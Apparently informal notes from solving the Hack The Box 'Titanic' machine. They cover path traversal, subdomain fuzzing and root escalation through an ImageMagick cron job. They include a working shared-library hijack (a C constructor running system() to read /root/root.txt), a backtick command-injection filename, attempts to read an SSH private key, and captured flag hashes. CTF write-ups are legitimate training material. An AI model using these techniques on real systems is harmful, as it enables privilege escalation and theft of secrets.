/download?ticket=cfeaa75a-0451-4c8f-884d-e589e6281539.json 

path traversal attack here
need to leak a username
username developer
try /home/developer/.ssh/id_rsa
id_rsa file not found

[Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 36ms]
| URL | http://titanic.htb
    * FUZZ: dev

found dev subdomain


could not crack the admin hash
25282528

3000 has a service running, 5000 has a service running
3000 is gitea
5000 is the website

what do with this
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log

maybe do a soft link to root?
but magick identify does not read a file right
yea so all i would get is information about the file
what is being run as root?
doesn't look like there is a mysql server anywhere


doesnt look like root executes the script though???
1) where does the images script get executed?
2) how to inject code into the images script

https://github.com/ImageMagick/ImageMagick/issues/6339

we need to create a file that looks something like this and figure out what calls identify_images
'|smile"`cat test.txt > leak.txt`".gif'

actually it might be this 
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
probs have to play with library paths
is there an AppRun script though?

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt >> flag.txt");
    exit(0);
}
EOF

find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log


how to get root to run it?
it does it automatically
8be33ad1490786f28dbd630936a821b7

